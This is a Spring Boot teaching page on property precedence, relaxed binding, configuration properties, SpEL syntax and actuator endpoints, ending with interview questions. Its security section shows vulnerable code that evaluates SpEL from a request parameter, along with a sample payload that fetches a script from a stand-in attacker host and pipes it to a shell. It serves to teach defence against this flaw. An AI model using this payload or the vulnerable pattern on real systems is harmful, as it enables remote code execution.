# Part 1 — ⭐ Property resolution order

**Spring Boot merges many property sources, and the order is precedence.** Higher wins.

```
 1. Devtools global settings                    (~/.config/spring-boot)
 2. @TestPropertySource / @SpringBootTest(properties = …)
 3. ⭐ Command-line arguments                    --server.port=9090
 4. SPRING_APPLICATION_JSON
 5. ServletConfig / ServletContext parameters
 6. JNDI
 7. ⭐ Java System properties                    -Dserver.port=9090
 8. ⭐ OS environment variables                  SERVER_PORT=9090
 9. Profile-specific application-{profile}.yml   (Day 136)
10. application.yml / .properties
11. @PropertySource on a @Configuration class
12. Default properties (SpringApplication.setDefaultProperties)
```

**The four you actually use are 3, 7, 8 and 9–10**, and the practical consequence is one sentence:

> **Environment variables override files, and command-line arguments override everything.** That is
> what makes one immutable image (Day 129B) configurable per environment without rebuilding it.

## Relaxed binding

**One of Boot's genuinely good ideas** — the same property is expressible in whatever form each
source needs:

```
app.payment-gateway.api-key       ⭐ canonical (kebab-case in YAML)
app.paymentGateway.apiKey         camelCase
app.payment_gateway.api_key       underscores
APP_PAYMENTGATEWAY_APIKEY         ⭐ the environment-variable form
APP_PAYMENT_GATEWAY_API_KEY       also works
```

**Environment variables cannot contain dots or dashes**, so relaxed binding is what makes
twelve-factor configuration possible at all. The rule: **uppercase, and replace `.` and `-` with
`_`**.

Use **kebab-case in YAML**. It is the documented canonical form, and it maps unambiguously back to
environment variables.

## Reading values

```java
@Value("${app.timeout}")                    Duration timeout;      // required — fails at startup
@Value("${app.timeout:5s}")                 Duration timeout;      // default after the colon
@Value("${app.timeout:}")                   String maybeEmpty;     // empty default
@Value("${DB_HOST:${db.host:localhost}}")   String host;           // ⭐ nested fallback
@Value("#{systemEnvironment['HOME']}")      String home;           // SpEL

env.getProperty("app.timeout", Duration.class, Duration.ofSeconds(5));
env.getRequiredProperty("app.api-key");     // ⭐ throws if absent
```

**⭐ Prefer `@ConfigurationProperties`** (Day 131) — grouped, type-safe, validated at startup,
discoverable in the IDE. `@Value` is for one-off values.

```java
@ConfigurationProperties(prefix = "app.payment")
@Validated
public record PaymentProperties(
        @NotBlank String apiKey,
        @DefaultValue("5s") Duration timeout,
        @Min(1) @Max(10) int maxRetries,
        List<String> allowedCurrencies,
        Map<String, String> providerUrls) { }
```

Boot converts strings to rich types automatically, which is worth knowing because people write
parsers for these:

```yaml
app:
  timeout: 30s              → Duration      (also 500ms, 2m, 1h, PT30S)
  max-size: 10MB            → DataSize      (also 1GB, 512KB)
  start-date: 2026-08-14    → LocalDate
  allowed: [INR, USD]       → List<String>
  urls:                     → Map<String,String>
    stripe: https://…
```

## Configuration is code — validate it

```java
@ConfigurationProperties(prefix = "app")
@Validated
public record AppProperties(@NotBlank String name, @Valid Payment payment) {
    public record Payment(@NotBlank String apiKey, @Positive int retries) { }
}
```

> **A missing or malformed configuration value must fail the boot, never the first request** (Day
> 062, Day 132). An application that starts happily and then fails at 3 AM on its first payment has
> hidden the problem until the worst possible moment.

**Where configuration actually comes from in production:**

| Source | For |
|---|---|
| `application.yml` | Defaults and non-secret settings, committed |
| Environment variables | Per-environment values, injected by the platform |
| **A secrets manager** | ⭐ Credentials — Vault, AWS Secrets Manager, K8s secrets as **files** |
| Spring Cloud Config | Centralised configuration, with refresh |

⚠️ **Never commit secrets to `application.yml`** (Day 085). And prefer **file-mounted secrets to
environment variables** — Day 129B's point: environment variables appear in `docker inspect`,
`/proc/<pid>/environ` and crash reports.

# Part 2 — SpEL

**A full expression language evaluated at runtime**, written in `#{…}` — distinct from `${…}`, which
is property placeholder resolution.

```java
@Value("#{2 + 3}")                                       int five;
@Value("#{systemProperties['user.timezone']}")           String tz;
@Value("#{orderService.defaultCurrency}")                String currency;   // another BEAN
@Value("#{T(java.time.Duration).ofSeconds(30)}")         Duration d;        // static access
@Value("#{${app.pool-size} * 2}")                        int doubled;       // ⭐ ${} resolves FIRST
@Value("#{'${app.regions}'.split(',')}")                 List<String> regions;
```

**`${}` is resolved before `#{}`** — string substitution first, then expression evaluation. That
ordering explains the last two examples and is a common source of confusion.

## Where SpEL appears in Spring

```java
@PreAuthorize("hasRole('ADMIN') and #order.customerId == authentication.name")   // ⭐ Day 176
@Cacheable(value = "orders", key = "#customerId + ':' + #status")                // ⭐ Day 168
@Cacheable(value = "orders", condition = "#page < 5", unless = "#result.isEmpty()")
@EventListener(condition = "#event.priority > 5")                                // Day 133
@Query("SELECT o FROM Order o WHERE o.tenant = :#{principal.tenantId}")          // ⚠️ Day 163b
@ConditionalOnExpression("${feature.enabled:false} and '${env}' == 'prod'")
```

**This is why SpEL matters**: you will meet it in cache keys and security expressions long before you
would choose to write it. `@Cacheable`'s `key` and `@PreAuthorize`'s expression are the two you will
actually use.

## Cache keys — the practical case

```java
@Cacheable(value = "orders", key = "#tenantId + ':' + #orderId")     // ⭐ Day 120's tenant rule
public Order find(String tenantId, String orderId) { … }
```

**Day 120's warning applies directly: a cache key missing the tenant is a cross-tenant data leak.**
The default key generator uses *all* method parameters, which is usually correct — but the moment
you write an explicit key, you own that correctness. Include every dimension that affects the result.

## The syntax worth knowing

```java
"#root"                          the root object
"#param"                         a method parameter (needs -parameters, or use #p0)
"#result"                        the return value (in unless / @CachePut)
"T(java.lang.Math).random()"     a static type reference
"@beanName.method()"             ⭐ call another bean
"list.?[price > 100]"            selection — filter
"list.![name]"                   projection — map
"user?.address?.city"            safe navigation (Day 058's Optional, in expression form)
"a > b ? 'x' : 'y'"              ternary
"value ?: 'default'"             Elvis
```

# Part 3 — ⚠️ SpEL is a security surface

> **SpEL can call arbitrary methods, including `Runtime.exec`. Never build a SpEL expression from
> user input.**

```java
// 💀 remote code execution
String expression = request.getParameter("filter");
parser.parseExpression(expression).getValue();

// an attacker sends:
//   T(java.lang.Runtime).getRuntime().exec('curl attacker.com/x | sh')
```

This is the same class of vulnerability as **Log4Shell** (Day 073A) and the Spring4Shell family:
**an expression language evaluating attacker-controlled input.** It is Day 119b's general principle
— *any time user input is concatenated into something that gets parsed, you have an injection
vulnerability* — with SpEL as the parser.

⚠️ **Spring Data `@Query` with SpEL is the specific trap** (Day 163b covers it in full):

```java
@Query("SELECT o FROM Order o WHERE o.status = :#{#status}")     // ⚠️ SpEL, evaluated before binding
```

The SpEL runs *before* parameter binding, so user input reaching a SpEL expression escapes the
protection of the prepared statement entirely. **Use plain named parameters** (`:status`) unless you
have a specific reason not to.

**If you genuinely must evaluate a user-supplied expression**, restrict the evaluation context:

```java
SimpleEvaluationContext ctx = SimpleEvaluationContext
        .forReadOnlyDataBinding()               // ⭐ no type references, no method invocation
        .withRootObject(safeRoot)
        .build();
parser.parseExpression(userExpression).getValue(ctx);
```

`SimpleEvaluationContext` removes `T()` type references, bean references and constructor calls — the
allow-list approach from Day 105, applied to an expression language. **`StandardEvaluationContext`
(the default) allows everything**, and using it on untrusted input is remote code execution.

**And the honest recommendation:** do not offer user-supplied expressions at all. A structured filter
DSL (Day 108's allow-listed operators) gives users the flexibility they wanted without handing them a
Turing-complete language running inside your JVM.

# Part 4 — Externalised configuration in practice

```yaml
# application.yml — committed. Defaults and structure.
app:
  payment:
    timeout: 5s
    max-retries: 3
    allowed-currencies: [INR, USD]
  cache:
    ttl: 5m

spring:
  datasource:
    url: ${DATABASE_URL}                  # ⭐ no default — MUST be provided
    username: ${DATABASE_USER}
    password: ${DATABASE_PASSWORD}
  jpa:
    open-in-view: false                   # ⭐ Day 160 — turn this off deliberately

server:
  shutdown: graceful                      # Day 133
  port: ${PORT:8080}

logging:
  level:
    root: INFO
    com.acme: ${LOG_LEVEL:INFO}
```

**Three habits visible in that file:**

**Structure and defaults in the file; secrets and per-environment values from the environment.** The
file is committed and readable; nothing in it is sensitive.

**No default for required secrets.** `${DATABASE_URL}` with no fallback fails the boot if unset —
which is exactly what you want (Day 079's `${VAR:?}`).

**Deliberate values for things Boot defaults badly**, like `open-in-view` and `shutdown`.

## Inspecting the resolved configuration

```bash
curl localhost:8080/actuator/env               # ⚠️ every property source, in order
curl localhost:8080/actuator/configprops       # ⚠️ all @ConfigurationProperties
```

**Invaluable for debugging "why is this value not what I set?"** — the response shows every source
and which one won.

⚠️ **Both endpoints are dangerous.** They expose configuration including, potentially, secrets. Boot
sanitises keys matching `password`, `secret`, `key`, `token` and similar, **but only by name** — a
credential in a property called `app.stripe.credential` is shown in full. **Never expose them
publicly** (Day 119's API8 misconfiguration).

```properties
management.endpoints.web.exposure.include=health,info
management.endpoint.env.show-values=WHEN_AUTHORIZED
```

## Refreshable configuration

```java
@RefreshScope                                   // Spring Cloud
@ConfigurationProperties(prefix = "app.feature")
class FeatureProperties { … }
```

`@RefreshScope` recreates the bean when `/actuator/refresh` is called, so configuration can change
without a restart. **It is a proxy** (Day 137), with all the same caveats — and it is *not* a
substitute for a proper feature-flag system when you need per-user or percentage rollouts (Day 088).

## Common mistakes

| Mistake | Consequence |
|---|---|
| Not knowing the precedence order | Cannot explain why a value is not what you set |
| Wrong environment-variable form | The value is silently ignored; the default is used |
| Secrets committed in `application.yml` | Credentials in Git (Day 085) |
| Secrets in environment variables | Visible in `inspect`, `/proc`, crash reports |
| Configuration validated lazily | Fails on the first real request, not at boot |
| `@Value` scattered instead of `@ConfigurationProperties` | Ungrouped, unvalidated, undiscoverable |
| Confusing `${}` with `#{}` | Placeholder versus expression — different mechanisms |
| **SpEL from user input** | ⚠️ **Remote code execution** |
| `StandardEvaluationContext` for untrusted input | Same |
| SpEL in a Spring Data `@Query` with user input | Escapes prepared-statement protection |
| Cache key missing the tenant | Cross-tenant leak (Day 120) |
| `/actuator/env` exposed | Configuration and possibly secrets disclosed |
| Assuming sanitisation covers every secret | It matches key names only |

## Interview questions

**Q: Give Spring Boot's property precedence order.**
Command-line arguments, then system properties, then environment variables, then profile-specific
files, then `application.yml`, then defaults — with test properties above all in tests. That ordering
is what lets one immutable image be configured per environment.

**Q: What is relaxed binding?**
Boot matches `app.payment-gateway.api-key` against camelCase, underscores and the uppercase
environment-variable form `APP_PAYMENT_GATEWAY_API_KEY`. It exists because environment variables
cannot contain dots or dashes, so without it twelve-factor configuration would be impossible.

**Q: `@Value` or `@ConfigurationProperties`?**
`@ConfigurationProperties` with `@Validated` — grouped, type-safe, validated at startup and
discoverable in the IDE. `@Value` for one-off values. Configuration errors should fail the boot.

**Q: What is the difference between `${}` and `#{}`?**
`${}` is property placeholder resolution — a string substituted from a property source. `#{}` is a
SpEL expression evaluated at runtime. `${}` resolves first, so the result can be embedded in an
expression.

**Q: Why is SpEL a security concern?**
It can invoke arbitrary methods, including `Runtime.exec`, so evaluating attacker-controlled input is
remote code execution — the same class as Log4Shell. If you must evaluate user input, use
`SimpleEvaluationContext`, which removes type references and method invocation; the default
`StandardEvaluationContext` allows everything.

**Q: What is the trap with SpEL in Spring Data `@Query`?**
The expression is evaluated before parameter binding, so user input reaching it bypasses the prepared
statement's protection entirely. Use plain named parameters.

**Q: Where do secrets belong?**
Not in `application.yml`, and preferably not in environment variables — those are visible in
`docker inspect`, `/proc` and crash reports. Use a secrets manager or file-mounted secrets with
restricted permissions.

**Q: How do you debug a configuration value that is not what you expect?**
`/actuator/env` shows every property source in precedence order and which one won — but it must never
be publicly exposed, because sanitisation matches key names only.

## 🎙️ Articulation drill

Two minutes: **"How do you configure a Spring Boot application across environments?"**

Structure and defaults in a committed `application.yml`, per-environment values from environment
variables, secrets from a secrets manager as mounted files; typed `@ConfigurationProperties` with
validation so a bad value fails the boot rather than the first request; profile-specific files for
overrides only. Close with the precedence order and `/actuator/env` as the way to prove where a value
came from — and the warning that it must never be publicly exposed.
